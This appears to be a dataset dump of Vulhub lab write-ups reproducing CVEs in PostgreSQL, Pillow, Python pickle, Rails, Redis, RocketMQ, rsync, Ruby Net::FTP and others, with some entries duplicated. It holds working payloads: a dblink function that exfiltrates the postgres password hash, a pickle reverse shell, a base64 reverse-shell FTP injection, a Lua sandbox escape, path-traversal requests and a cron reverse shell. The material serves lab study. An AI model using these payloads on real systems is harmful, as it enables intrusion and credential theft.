Execute the following command to start a vulnerable PostgreSQL server:


docker compose up -d


The server will start and listen on the default PostgreSQL port 5432.

Vulnerability Reproduction

Following the second exploitation method from the references, we'll first connect to PostgreSQL as the regular user vulhub:vulhub:

bash
psql --host your-ip --username vulhub




Execute the following SQL statements and then exit:

sql
CREATE FUNCTION public.arraytostring(anyarray,text) RETURNS TEXT AS $$
    select dblinkconnect((select 'hostaddr=10.0.0.1 port=5433 user=postgres password=chybeta sslmode=disable dbname='||(SELECT passwd FROM pgshadow WHERE usename='postgres'))); 
    SELECT pgcatalog.arrayto_string($1,$2);
$$ LANGUAGE SQL VOLATILE;


Now, set up a listener on port 5433 at 10.0.0.1 to wait for the superuser to trigger our ""backdoor"".

(Simulating superuser actions) On the target machine, execute the pg_dump command as the superuser:

bash
docker compose exec postgres pg_dump -U postgres -f evil.bak vulhub


This command will export the contents of the vulhub database. When executed, our ""backdoor"" is triggered, and sensitive information is received on the 10.0.0.1 machine:



This is just one of several exploitation methods for this vulnerability. For more exploitation techniques, please refer to the articles in the References section.
-------------------------------------------------------------------------------","PostgreSQL Privilege Escalation (CVE-2018-1058)

中文文档

PostgreSQL is a powerful open-source relational database system. A logical error exists in versions 9.3 through 10, where superusers can unknowingly execute malicious code created by regular users, leading to unexpected operations.

References:
https://wiki.postgresql.org/wiki/AGuidetoCVE-2018-1058:ProtectYourSearch_Path
https://xianzhi.aliyun.com/forum/topic/2109

Environment Setup

Execute the following command to start a vulnerable PostgreSQL server:


docker compose up -d


The server will start and listen on the default PostgreSQL port 5432.

Vulnerability Reproduction

Following the second exploitation method from the references, we'll first connect to PostgreSQL as the regular user vulhub:vulhub:

bash
psql --host your-ip --username vulhub




Execute the following SQL statements and then exit:

sql
CREATE FUNCTION public.arraytostring(anyarray,text) RETURNS TEXT AS $$
    select dblinkconnect((select 'hostaddr=10.0.0.1 port=5433 user=postgres password=chybeta sslmode=disable dbname='||(SELECT passwd FROM pgshadow WHERE usename='postgres'))); 
    SELECT pgcatalog.arrayto_string($1,$2);
$$ LANGUAGE SQL VOLATILE;


Now, set up a listener on port 5433 at 10.0.0.1 to wait for the superuser to trigger our ""backdoor"".

(Simulating superuser actions) On the target machine, execute the pg_dump command as the superuser:

bash
docker compose exec postgres pg_dump -U postgres -f evil.bak vulhub


This command will export the contents of the vulhub database. When executed, our ""backdoor"" is triggered, and sensitive information is received on the 10.0.0.1 machine:



This is just one of several exploitation methods for this vulnerability. For more exploitation techniques, please refer to the articles in the References section.
-------------------------------------------------------------------------------","https://wiki.postgresql.org/wiki/A_Guide_to_CVE-2018-1058:_Protect_Your_Search_Path
https://xianzhi.aliyun.com/forum/topic/2109"
postgres,CVE-2019-9193,"PostgreSQL Arbitrary Command Execution with Admin Privileges (CVE-2019-9193)

中文文档

PostgreSQL is a powerful open-source relational database system. A ""feature"" exists in versions 9.3 through 11 that allows administrators or users with ""COPY TO/FROM PROGRAM"" privileges to execute arbitrary commands on the system.

References:
<https://medium.com/greenwolf-security/authenticated-arbitrary-command-execution-on-postgresql-9-3-latest-cd18945914d5

Environment Setup

Execute the following command to start a vulnerable PostgreSQL 10.7 server:


docker compose up -d


The server will start and listen on the default PostgreSQL port 5432, with default credentials postgres/postgres.

Vulnerability Reproduction

First, connect to the PostgreSQL server and execute the following proof of concept:

sql
DROP TABLE IF EXISTS cmd_exec;
CREATE TABLE cmdexec(cmdoutput text);
COPY cmd_exec FROM PROGRAM 'id';
SELECT * FROM cmd_exec;


The FROM PROGRAM statement will execute the id command and save the results in the cmd_exec table:
-------------------------------------------------------------------------------","PostgreSQL Arbitrary Command Execution with Admin Privileges (CVE-2019-9193)

中文文档

PostgreSQL is a powerful open-source relational database system. A ""feature"" exists in versions 9.3 through 11 that allows administrators or users with ""COPY TO/FROM PROGRAM"" privileges to execute arbitrary commands on the system.

References:
<https://medium.com/greenwolf-security/authenticated-arbitrary-command-execution-on-postgresql-9-3-latest-cd18945914d5

Environment Setup

Execute the following command to start a vulnerable PostgreSQL 10.7 server:


docker compose up -d


The server will start and listen on the default PostgreSQL port 5432, with default credentials postgres/postgres.

Vulnerability Reproduction

First, connect to the PostgreSQL server and execute the following proof of concept:

sql
DROP TABLE IF EXISTS cmd_exec;
CREATE TABLE cmdexec(cmdoutput text);
COPY cmd_exec FROM PROGRAM 'id';
SELECT * FROM cmd_exec;


The FROM PROGRAM statement will execute the id command and save the results in the cmd_exec table:
-------------------------------------------------------------------------------",https://medium.com/greenwolf-security/authenticated-arbitrary-command-execution-on-postgresql-9-3-latest-cd18945914d5
python,Unknown,Python PIL/Pillow Remote Command Execution (GhostButt / CVE-2017-8291),"Python PIL/Pillow Remote Command Execution (GhostButt / CVE-2017-8291)

中文版本(Chinese version)

Python PIL (Pillow) is a popular image processing library for Python. It supports various image formats and provides powerful image manipulation capabilities.

The Python image processing module PIL (Pillow) is affected by the GhostButt vulnerability (CVE-2017-8291) because it internally calls GhostScript to process EPS images. This vulnerability allows attackers to execute arbitrary commands on the target system.

When PIL processes an image, it determines the image type based on the file header (Magic Bytes). If it identifies an EPS file (header starting with %!PS), it passes the file to PIL/EpsImagePlugin.py for processing.

In this module, PIL calls the system's GhostScript command (gs) to process the image file:

python
command = [""gs"",
            ""-q"",                         # quiet mode
            ""-g%dx%d"" % size,             # set output geometry (pixels)
            ""-r%fx%f"" % res,              # set input DPI (dots per inch)
            ""-dBATCH"",                    # exit after processing
            ""-dNOPAUSE"",                  # don't pause between pages,
            ""-dSAFER"",                    # safe mode
            ""-sDEVICE=ppmraw"",            # ppm driver
            ""-sOutputFile=%s"" % outfile,  # output file
            ""-c"", ""%d %d translate"" % (-bbox[0], -bbox[1]),
                                            # adjust for image origin
            ""-f"", infile,                 # input file
            ]

Code to check if GhostScript is installed is omitted
try:
    with open(os.devnull, 'w+b') as devnull:
        subprocess.check_call(command, stdin=devnull, stdout=devnull)
    im = Image.open(outfile)


Although the -dSAFER flag is set (safe mode), a sandbox bypass vulnerability in GhostScript (GhostButt CVE-2017-8291) allows this safety mechanism to be bypassed, enabling arbitrary command execution.

As of this writing, even the latest official GhostScript version 9.21 is still affected by this vulnerability. Therefore, as long as GhostScript is installed on the operating system, PIL is vulnerable to command execution.

References:
Exploiting Python PIL Module Command Execution Vulnerability
CVE-2017-8291 Details
GhostScript Security Advisory

Environment Setup

Execute following command to start a web application that is vulnerable to the CVE-2017-8291 vulnerability:


docker compose up -d


After starting, visit http://your-ip:8000/ to access the upload page.

Vulnerability Exploitation

The normal functionality of this application allows users to upload a PNG file. The backend uses PIL to load the image and output its dimensions. However, we can exploit this by changing the extension of an executable EPS file to PNG and uploading it. Since the backend determines the image type based on the file header rather than the extension, the file extension check can be bypassed.

For example, we can upload poc.png, which will execute the command touch /tmp/aaaaa on the server. By modifying the command in the POC to a reverse shell command, we can obtain shell access to the server:
-------------------------------------------------------------------------------",
python,Unknown,"Python PIL/Pillow Remote Command Execution (CVE-2018-16509)

中文文档

PIL/Pillow is a widely used image processing library in Python.

In Ghostscript versions prior to 9.24, there exists a -dSAFER sandbox bypass vulnerability (CVE-2018-16509). Incorrect ""restoration of privilege"" checking during handling of /invalidaccess exceptions could be used by attackers able to supply crafted PostScript to execute code using the ""pipe"" instruction.

This vulnerability affects various applications that use Ghostscript for image processing, including Python's PIL/Pillow library. When an application uses PIL/Pillow to process user-uploaded images and the environment has a vulnerable version of Ghostscript installed, it may lead to remote command execution.

References:
Ghostscript: -dSAFER bypass (CVE-2018-16509)
PIL/Pillow EPS Image Processing
Ghostscript Sandbox Bypass Analysis

Environment Setup

Execute the following command to start a vulnerable Flask application (using Ghostscript 9.23):


docker compose up -d


After the environment is started, visit http://your-ip:8000 to see a simple image upload page.

Vulnerability Reproduction

Prepare a malicious EPS file (provided as rce.jpg in this environment) with the following content:


%!PS-Adobe-3.0 EPSF-3.0
%%BoundingBox: -0 -0 100 100

userdict /setpagedevice undef
save
legal
{ null restore } stopped { pop } if
{ legal } stopped { pop } if
restore
mark /OutputFile (%pipe%touch /tmp/got_rce) currentdevice putdeviceprops


Visit http://your-ip:8000 and upload this file.

After uploading, the server will process this image using PIL/Pillow, and when the resize function is called, it will trigger the vulnerability and execute the touch /tmp/got_rce command.

Execute the following command to verify if the vulnerability has been successfully exploited:


docker compose exec web ls -la /tmp/


If you see the /tmp/got_rce file, it means the command execution was successful.

Vulnerability Analysis

The core of the vulnerability lies in PIL/Pillow calling the system's Ghostscript program when processing EPS images. In EPSImagePlugin.py, PIL uses subprocess to call Ghostscript:

python
command = [""gs"",
           ""-q"",                         # quiet mode
           ""-g%dx%d"" % size,             # set output geometry (pixels)
           ""-r%fx%f"" % res,              # set input DPI (dots per inch)
           ""-dBATCH"",                    # exit after processing
           ""-dNOPAUSE"",                  # don't pause between pages
           ""-dSAFER"",                    # safe mode
           ""-sDEVICE=ppmraw"",            # ppm driver
           ""-sOutputFile=%s"" % outfile,  # output file
           ""-c"", ""%d %d translate"" % (-bbox[0], -bbox[1]),
                                         # adjust for image origin
           ""-f"", infile,                 # input file
           ""-c"", ""showpage"",             # showpage
           ]


Although the -dSAFER parameter is used, Ghostscript versions prior to 9.24 have a sandbox bypass vulnerability that allows attackers to execute arbitrary commands through specially crafted PostScript code.

In the sample application, when an image is uploaded, it is processed as follows:

python
img = Image.open(img_path)
w, h = img.size
ratio = 256.0 / max(w, h)

resized_img = img.resize((int(w  ratio), int(h  ratio)))
resizedimg.save(imgpath)


Simply calling Image.open() will not trigger the vulnerability, but when methods that actually need to load image data, such as resize() or save(), are called, they will trigger the Ghostscript call and execute malicious commands.

To fix this vulnerability, you need to update Ghostscript to version 9.24 or higher, or disable EPS image processing functionality when using PIL/Pillow to process user-uploaded images.
-------------------------------------------------------------------------------","Python PIL/Pillow Remote Command Execution (CVE-2018-16509)

中文文档

PIL/Pillow is a widely used image processing library in Python.

In Ghostscript versions prior to 9.24, there exists a -dSAFER sandbox bypass vulnerability (CVE-2018-16509). Incorrect ""restoration of privilege"" checking during handling of /invalidaccess exceptions could be used by attackers able to supply crafted PostScript to execute code using the ""pipe"" instruction.

This vulnerability affects various applications that use Ghostscript for image processing, including Python's PIL/Pillow library. When an application uses PIL/Pillow to process user-uploaded images and the environment has a vulnerable version of Ghostscript installed, it may lead to remote command execution.

References:
Ghostscript: -dSAFER bypass (CVE-2018-16509)
PIL/Pillow EPS Image Processing
Ghostscript Sandbox Bypass Analysis

Environment Setup

Execute the following command to start a vulnerable Flask application (using Ghostscript 9.23):


docker compose up -d


After the environment is started, visit http://your-ip:8000 to see a simple image upload page.

Vulnerability Reproduction

Prepare a malicious EPS file (provided as rce.jpg in this environment) with the following content:


%!PS-Adobe-3.0 EPSF-3.0
%%BoundingBox: -0 -0 100 100

userdict /setpagedevice undef
save
legal
{ null restore } stopped { pop } if
{ legal } stopped { pop } if
restore
mark /OutputFile (%pipe%touch /tmp/got_rce) currentdevice putdeviceprops


Visit http://your-ip:8000 and upload this file.

After uploading, the server will process this image using PIL/Pillow, and when the resize function is called, it will trigger the vulnerability and execute the touch /tmp/got_rce command.

Execute the following command to verify if the vulnerability has been successfully exploited:


docker compose exec web ls -la /tmp/


If you see the /tmp/got_rce file, it means the command execution was successful.

Vulnerability Analysis

The core of the vulnerability lies in PIL/Pillow calling the system's Ghostscript program when processing EPS images. In EPSImagePlugin.py, PIL uses subprocess to call Ghostscript:

python
command = [""gs"",
           ""-q"",                         # quiet mode
           ""-g%dx%d"" % size,             # set output geometry (pixels)
           ""-r%fx%f"" % res,              # set input DPI (dots per inch)
           ""-dBATCH"",                    # exit after processing
           ""-dNOPAUSE"",                  # don't pause between pages
           ""-dSAFER"",                    # safe mode
           ""-sDEVICE=ppmraw"",            # ppm driver
           ""-sOutputFile=%s"" % outfile,  # output file
           ""-c"", ""%d %d translate"" % (-bbox[0], -bbox[1]),
                                         # adjust for image origin
           ""-f"", infile,                 # input file
           ""-c"", ""showpage"",             # showpage
           ]


Although the -dSAFER parameter is used, Ghostscript versions prior to 9.24 have a sandbox bypass vulnerability that allows attackers to execute arbitrary commands through specially crafted PostScript code.

In the sample application, when an image is uploaded, it is processed as follows:

python
img = Image.open(img_path)
w, h = img.size
ratio = 256.0 / max(w, h)

resized_img = img.resize((int(w  ratio), int(h  ratio)))
resizedimg.save(imgpath)


Simply calling Image.open() will not trigger the vulnerability, but when methods that actually need to load image data, such as resize() or save(), are called, they will trigger the Ghostscript call and execute malicious commands.

To fix this vulnerability, you need to update Ghostscript to version 9.24 or higher, or disable EPS image processing functionality when using PIL/Pillow to process user-uploaded images.
-------------------------------------------------------------------------------",
python,Unknown,Python Unpickle Deserialization Remote Code Execution,"Python Unpickle Deserialization Remote Code Execution

中文版本(Chinese version)

Python's pickle module is a popular serialization/deserialization tool that converts Python objects into byte streams and vice versa. However, when untrusted data is deserialized using pickle, it can lead to arbitrary code execution.

This vulnerability occurs when an application deserializes user-controlled data using the pickle module without proper validation. An attacker can craft a malicious serialized object that, when deserialized, executes arbitrary commands on the target system.

References:
http://rickgray.me/2015/09/12/django-command-execution-analysis.html
https://www.leavesongs.com/PENETRATION/zhangyue-python-web-code-execute.html
https://docs.python.org/3/library/pickle.html#pickle.loads
https://intoli.com/blog/dangerous-pickles/

Environment Setup

Execute the following command to start the vulnerable Flask application:


docker compose build
docker compose up -d


After the server is started, you can access http://your-ip:8000 in your browser. The page will display Hello {username}!, where username is retrieved from the 'user' cookie. The application performs base64 decoding and deserialization on this cookie to extract the ""username"" variable. If no valid cookie is found, it defaults to ""Guest"".

The vulnerable code in app.py looks like this:

python
@app.route(""/"")
def index():
    try:
        user = base64.b64decode(request.cookies.get('user'))
        user = pickle.loads(user)
        username = user[""username""]
    except:
        username = ""Guest""

    return ""Hello %s"" % username


Vulnerability Reproduction

To exploit this vulnerability, we need to create a malicious pickle object that will execute arbitrary commands when deserialized. The exploit uses Python's reduce method to specify what function to call when the object is unpickled.

The provided exploit script (exp.py) creates a malicious pickle object that establishes a reverse shell connection to the attacker's machine:

python
class exp(object):
    def reduce(self):
        s = """"""python -c 'import socket,subprocess,os;s=socket.socket(socket.AFINET,socket.SOCKSTREAM);s.connect((""172.18.0.1"",80));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([""/bin/bash"",""-i""]);'""""""
        return (os.system, (s,))


To execute the exploit, first set up a netcat listener on your machine to receive the reverse shell:


nc -lvp 80


Then run the exploit script to send the malicious cookie to the vulnerable application:


python3 exp.py


When the server deserializes the malicious pickle object, it will execute the command and establish a reverse shell connection to your machine:
-------------------------------------------------------------------------------","http://rickgray.me/2015/09/12/django-command-execution-analysis.html
https://www.leavesongs.com/PENETRATION/zhangyue-python-web-code-execute.html
https://docs.python.org/3/library/pickle.html#pickle.loads
https://intoli.com/blog/dangerous-pickles/"
rails,CVE-2019-5418,Ruby on Rails Path Traversal and Arbitrary File Read (CVE-2019-5418),"Ruby on Rails Path Traversal and Arbitrary File Read (CVE-2019-5418)

中文版本(Chinese version)

Ruby on Rails is a web application framework that allows developers to build web applications quickly and easily.

There is a local file inclusion vulnerability in Ruby on Rails action view <5.2.2.1, <5.1.6.2, <5.0.7.2, <4.2.11.1 and v3.

When using render file in a controller to render views outside the application, Rails determines the file location based on the user-supplied Accept header. By sending an Accept header with the value Accept: ../../../../../../../../etc/passwd{{, attackers can exploit a path traversal vulnerability to read arbitrary files.

References:
https://groups.google.com/forum/#!topic/rubyonrails-security/pFRKI96Sm8Q
https://github.com/mpgn/CVE-2019-5418
https://xz.aliyun.com/t/4448

Environment Setup

Execute the following command to compile and start Ruby on Rails 5.2.2:


docker compose build
docker compose up -d


After the server starts, visit http://your-ip:3000 to see the Ruby on Rails welcome page.

Vulnerability Reproduction

Visit http://your-ip:3000/robots to see that the normal robots.txt file is being read.

To exploit the vulnerability, send the following request to read /etc/passwd:


GET /robots HTTP/1.1
Host: your-ip:3000
Accept-Encoding: gzip, deflate
Accept: ../../../../../../../../etc/passwd{{
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close




Successfully read the file:
-------------------------------------------------------------------------------","https://groups.google.com/forum/#!topic/rubyonrails-security/pFRKI96Sm8Q
https://github.com/mpgn/CVE-2019-5418
https://xz.aliyun.com/t/4448"
rails,CVE-2018-3760,Ruby On Rails Path Traversal Vulnerability（CVE-2018-3760）,"Ruby On Rails Path Traversal Vulnerability（CVE-2018-3760）

中文版本(Chinese version)

Ruby On Rails is a well-known Ruby Web development framework, which uses Sprockets as a static file server in development environment. Sprockets is a Ruby library that compiles and distributes static resource files.

There is a path traversal vulnerability caused by secondary decoding in Sprockets 3.7.1 and lower versions. An attacker can use %252e%252e/ to access the root directory and read or execute any file on the target server.

Reference links：
https://i.blackhat.com/us-18/Wed-August-8/us-18-Orange-Tsai-Breaking-Parser-Logic-Take-Your-Path-Normalization-Off-And-Pop-0days-Out-2.pdf
https://seclists.org/oss-sec/2018/q2/210
https://xz.aliyun.com/t/2542

Environment setup

Enter the following command：


docker compose up -d


Visit http://your-ip:3000 and you'll see the welcome page.

POC

It will give an error by visiting http://your-ip:3000/assets/file:%2f%2f/etc/passwd directly, as the file /etc/passwd is not in the allowed directory.



We can get a list of allowed directories by the error page. Just select one of them, such as /usr/src/blog/app/assets/images, then use %252e%252e/ to jump to the parent directory, and finally read the file /etc/passwd:


http://your-ip:3000/assets/file:%2f%2f/usr/src/blog/app/assets/images/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/etc/passwd
-------------------------------------------------------------------------------","https://i.blackhat.com/us-18/Wed-August-8/us-18-Orange-Tsai-Breaking-Parser-Logic-Take-Your-Path-Normalization-Off-And-Pop-0days-Out-2.pdf
https://seclists.org/oss-sec/2018/q2/210
https://xz.aliyun.com/t/2542"
redis,Unknown,Redis Post Exploitation Due to Master and Slave Synchronisation,"Redis Post Exploitation Due to Master and Slave Synchronisation

中文版本(Chinese version)

Redis is an open source (BSD licensed), in-memory data structure store, used as a database, cache, and message broker.

Redis which version starts from 4.0, prior to 5.0.5, can be exploit through the synchronisation between master and slave by an authenticated visitor.

Reference:
<https://2018.zeronights.ru/wp-content/uploads/materials/15-redis-post-exploitation.pdf

Vulnerability Environment

Execute following command to start a Redis server 4.0.14:


docker compose up -d


After server is started, you can connect to this server without credentials by redis-cli:


redis-cli -h your-ip


Exploit

Use this script to execute arbitrary commands:
-------------------------------------------------------------------------------",https://2018.zeronights.ru/wp-content/uploads/materials/15-redis-post-exploitation.pdf
redis,CVE-2022-0543,Redis Lua Sandbox Escape and Remote Code Execution (CVE-2022-0543),"Redis Lua Sandbox Escape and Remote Code Execution (CVE-2022-0543)

中文版本(Chinese version)

Redis is an open source (BSD licensed), in-memory data structure store, used as a database, cache, and message broker.

Reginaldo Silva discovered that due to a packaging issue on Debian/Ubuntu, a remote attacker with the ability to execute arbitrary Lua scripts could possibly escape the Lua sandbox and execute arbitrary code on the host.

References:
<https://www.ubercomp.com/posts/2022-01-20redisondebianrce
<https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1005787

Vulnerability Environment

Execute following command to start a redis server 5.0.7 on Ubuntu:


docker compose up -d


After server is started, you can connect to this server without credentials by redis-cli:


redis-cli -h your-ip


Exploit

This vulnerability existed because the Lua library in Debian/Ubuntu is provided as a dynamic library. A package variable was automatically populated that in turn permitted access to arbitrary Lua functionality.

As this extended to, for example, you can use package.loadlib to load the modules from liblua, then use this module to execute the commands:

lua
local iol = package.loadlib(""/usr/lib/x8664-linux-gnu/liblua5.1.so.0"", ""luaopen_io"");
local io = io_l();
local f = io.popen(""id"", ""r"");
local res = f:read(""*a"");
f:close();
return res


Noted that you should specify a correct realpath for the liblua library. In this Vulhub environment (Ubuntu focal), the value is /usr/lib/x86_64-linux-gnu/liblua5.1.so.0.

Eval this script in redis shell:

lua
eval 'local iol = package.loadlib(""/usr/lib/x8664-linux-gnu/liblua5.1.so.0"", ""luaopenio""); local io = iol(); local f = io.popen(""id"", ""r""); local res = f:read(""*a""); f:close(); return res' 0


Execute the commands successful:
-------------------------------------------------------------------------------","https://www.ubercomp.com/posts/2022-01-20_redis_on_debian_rce
https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1005787"
rocketchat,CVE-2021-22911,Rocket Chat Pre-Auth Blind NoSQL Injection (CVE-2021-22911),"Rocket Chat Pre-Auth Blind NoSQL Injection (CVE-2021-22911)

中文版本(Chinese version)

Rocket.chat is an open source team chat platform.

At Rocket Chat from 3.12.1 to 3.13.2, The getPasswordPolicy method is vulnerable to NoSQL injection attacks and does not require authentication/authorization. It can be used to take over normal user accounts by leaking password reset tokens.

References:
https://blog.sonarsource.com/nosql-injections-in-rocket-chat
https://www.exploit-db.com/exploits/50108
https://github.com/CsEnox/CVE-2021-22911
https://paper.seebug.org/1652/

Vulnerable Application

Executing following command to start a Rocket Chat 3.12.1:


docker compose up -d


Once the server is started, visit http://your-ip:3000 to see the installation wizard.

After the installation is complete, in order to verify the attack, you need to add a normal user in the administration with the username vulhub and the email vulhub@vulhub.org.

Exploit

There is three steps to reproduce the vulnerability:

1. Reset the password on the login page, and the server will generate a Password Reset Token in the database
2. Use NoSQL injection to expose this Password Reset Token
3. Use Password Reset Token to change the user's password

At the step two, you can use $regex directive to perform the attack.

In my scenario, when $regex is equal to ^7, an error message returned:



When $regex is equal to ^8, the response is different. It proves that the Token is starts with 8:



Use this simple script CVE-2021-22911.py to exfiltrate the Password Reset Token:



Change user password successfully:
-------------------------------------------------------------------------------","https://blog.sonarsource.com/nosql-injections-in-rocket-chat
https://www.exploit-db.com/exploits/50108
https://github.com/CsEnox/CVE-2021-22911
https://paper.seebug.org/1652/"
rocketmq,CVE-2023-33246,Apache RocketMQ Broker Remote Command Execution (CVE-2023-33246),"Apache RocketMQ Broker Remote Command Execution (CVE-2023-33246)

中文版本(Chinese version)

RocketMQ is a distributed messaging and streaming platform with low latency, high performance and reliability, trillion-level capacity and flexible scalability.

For RocketMQ versions 5.1.0 and below, under certain conditions, there is a risk of remote command execution. Several components of RocketMQ, including NameServer, Broker, and Controller, are leaked on the extranet and lack permission verification, an attacker can exploit this vulnerability by using the update configuration function to execute commands as the system users that RocketMQ is running as. Additionally, an attacker can achieve the same effect by forging the RocketMQ protocol content. To prevent these attacks, users are recommended to upgrade to version 5.1.1 or above for using RocketMQ 5.x or 4.9.6 or above for using RocketMQ 4.x.

References:
<https://github.com/I5N0rth/CVE-2023-33246
<https://github.com/Le1a/CVE-2023-33246
<https://paper.seebug.org/2081/
<https://xz.aliyun.com/news/12137
<https://xz.aliyun.com/news/12035

Vulnerable environment

Use following command to start a RocketMQ broker 5.1.0:

shell
docker compose up -d


After the environment is started, the RocketMQ broker will listen on port 10911.

Exploit

The vulnerability exists in the configuration update functionality of RocketMQ's Broker component. The Broker component lacks proper authentication and input validation in its configuration update interface, allowing attackers to modify configuration values.

What makes this vulnerability particularly dangerous is RocketMQ's filter server mechanism. Every 30 seconds, RocketMQ executes the filter server by running a shell command. This command is constructed by concatenating strings that include the rocketmqHome value from the configuration. Since an attacker can control this configuration value and it's used directly in command construction without proper sanitization, this leads to command injection.

I made a simple exploit project to reproduce the vulnerability and execute arbitrary commands.

shell
wget https://github.com/vulhub/rocketmq-attack/releases/download/1.0/rocketmq-attack-1.0-SNAPSHOT.jar
java -jar rocketmq-attack-1.0-SNAPSHOT.jar AttackBroker --target your-ip:10911 --cmd ""touch /tmp/success""


Wait for up to 30 seconds, and you will see the touch /tmp/success command has been executed.
-------------------------------------------------------------------------------","https://github.com/I5N0rth/CVE-2023-33246
https://github.com/Le1a/CVE-2023-33246
https://paper.seebug.org/2081/
https://xz.aliyun.com/news/12137
https://xz.aliyun.com/news/12035
https://github.com/vulhub/rocketmq-attack/releases/download/1.0/rocketmq-attack-1.0-SNAPSHOT.jar"
rocketmq,CVE-2023-37582,Apache RocketMQ NameServer Arbitrary File Write (CVE-2023-37582),"Apache RocketMQ NameServer Arbitrary File Write (CVE-2023-37582)

中文版本(Chinese version)

Apache RocketMQ is a distributed messaging and streaming platform with low latency, high performance and reliability, trillion-level capacity and flexible scalability.

In RocketMQ versions 5.1.1 and below, there exists an arbitrary file write vulnerability in the NameServer component. The vulnerability exists in the configuration update functionality of RocketMQ's NameServer component. By sending an UPDATENAMESRVCONFIG command to the NameServer, an attacker can modify the configStorePath configuration item and its content, leading to arbitrary file write.

This vulnerability arises from an incomplete fix for CVE-2023-33246. In addressing CVE-2023-33246, the official team established a blocklist of configuration items that cannot be modified. However, the patch mistakenly designated the blocklist as configStorePathName, when it should have been configStorePath, leading to this outcome.

References:
<https://github.com/apache/rocketmq/pull/6843
<https://drun1baby.top/2023/11/21/CVE-2023-37582-Apache-RocketMQ-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/
<https://github.com/Malayke/CVE-2023-37582_EXPLOIT

Vulnerable Environment

Execute the following command to start a RocketMQ NameServer 5.1.0:

shell
docker compose up -d


After the environment is started, the RocketMQ NameServer will listen on port 9876.

Exploit

Use this simple exploit project to reproduce the vulnerability and write arbitrary file.

shell
wget https://github.com/vulhub/rocketmq-attack/releases/download/1.1/rocketmq-attack-1.1-SNAPSHOT.jar
java -jar rocketmq-attack-1.1-SNAPSHOT.jar AttackNamesrv --target your-ip:9876 --path ""/tmp/success"" --content ""aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa""


After execution, you can verify that the file has been written successfully:

shell
cat /tmp/success


The content ""aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"" should be present in the file.
-------------------------------------------------------------------------------","https://github.com/apache/rocketmq/pull/6843
https://drun1baby.top/2023/11/21/CVE-2023-37582-Apache-RocketMQ-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/
https://github.com/Malayke/CVE-2023-37582_EXPLOIT
https://github.com/vulhub/rocketmq-attack/releases/download/1.1/rocketmq-attack-1.1-SNAPSHOT.jar"
rsync,Unknown,Rsync Unauthorized Access,"Rsync Unauthorized Access

中文版本(Chinese version)

Rsync is a data backup tool for Linux that supports remote file transfer through rsync protocol and ssh protocol. The rsync protocol listens on port 873 by default. If the target has enabled rsync service and hasn't configured ACL or access password, we can read and write files on the target server.

Environment Setup

Compile and run the rsync server:


docker compose build
docker compose up -d


After the environment starts, we can access it using the rsync command:


rsync rsync://your-ip:873/


You can view the list of module names:



Vulnerability Reproduction

As shown above, there is a src module. Let's list the files under this module:


rsync rsync://your-ip:873/src/




This is a Linux root directory, and we can download any file:


rsync -av rsync://your-ip:873/src/etc/passwd ./


Or write any file:


rsync -av shell rsync://your-ip:873/src/etc/cron.d/shell


We wrote a cron task and successfully got a reverse shell:
-------------------------------------------------------------------------------",
ruby,CVE-2017-17405,Ruby Net::FTP Module Command Injection (CVE-2017-17405),"Ruby Net::FTP Module Command Injection (CVE-2017-17405)

中文版本(Chinese version)

Ruby Net::FTP module is a FTP library provided by Ruby core.

Ruby before 2.4.3 allows Net::FTP command injection. Net::FTP#get, getbinaryfile, gettextfile, put, putbinaryfile, and puttextfile use Kernel#open to open a local file. If the localfile argument starts with the ""|"" pipe character, the command following the pipe character is executed. The default value of localfile is File.basename(remotefile), so malicious FTP servers could cause arbitrary command execution.

References:
<https://blog.heroku.com/identifying-ruby-ftp-cve
<https://www.exploit-db.com/exploits/43381

Vulnerable environment

Execute following command to start a Ruby 2.4.1 webserver that uses Net::FTP to download FTP file:


docker compose up -d


After the server is started, a simple webserver is running on http://your-ip:8080/. What this server does is that when we visit http://your-ip:8080/download?uri=ftp://example.com:2121/&file=vulhub.txt, it downloads the file vulhub.txt from FTP server example.com:2121.

Exploit

Since this is an FTP client vulnerability, we have to to run a simple FTP server that can be accessed. For example, using Python's pyftpdlib:


intsall pyftpdlib
pip install pyftpdlib

start a FTP server on 0.0.0.0:2121
python3 -m pyftpdlib -p 2121 -i 0.0.0.0


Then, use this FTP server address as the uri parameter and the payload |touch${IFS}success.txt as the file parameter in following request:


GET /download?uri=ftp://example.com:2121/&file=|touch${IFS}success.txt HTTP/1.1
Host: localhost:8080
Accept-Encoding: gzip, deflate, br
Accept: /
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.118 Safari/537.36
Connection: close
Cache-Control: max-age=0






Go into the docker container, you can see the success.txt has been created successfully:



Change the payload to |bash${IFS}-c${IFS}'{echo,YmFzaCAtaSA...}|{base64,-d}|{bash,-i}' and get a reverse shell:
-------------------------------------------------------------------------------","https://blog.heroku.com/identifying-ruby-ftp-cve
https://www.exploit-db.com/exploits/43381"
saltstack,CVE-2020-11652,SaltStack Arbitrary File Read and Write (CVE-2020-11652),"SaltStack Arbitrary File Read and Write (CVE-2020-11652)

中文版本(Chinese version)

SaltStack is a Python-based client-server configuration management tool. A security team disclosed that SaltStack has an authentication bypass vulnerability (CVE-2020-11651) and a directory traversal vulnerability (CVE-2020-11652).

In the CVE-2020-11652, attackers can read and write arbitrary files on the server by constructing malicious requests.

References:
https://labs.f-secure.com/advisories/saltstack-authorization-bypass
[https://github.com/rossengeorgiev/salt-security-backports][1]
[https://github.com/jasperla/CVE-2020-11651-poc][2]

Environment Setup

Execute the following command to start a SaltStack Master service 2019.2.3:


docker compose up -d


After the environment starts, the following ports will be listening:
4505/4506: These are the ports for communication between SaltStack Master and minions
8000: This is the Salt API port
2222: This is the SSH server port inside the container

Vulnerability Reproduction

This document demonstrates the CVE-2020-11652 vulnerability, referring to the vulnerability author's explanation:

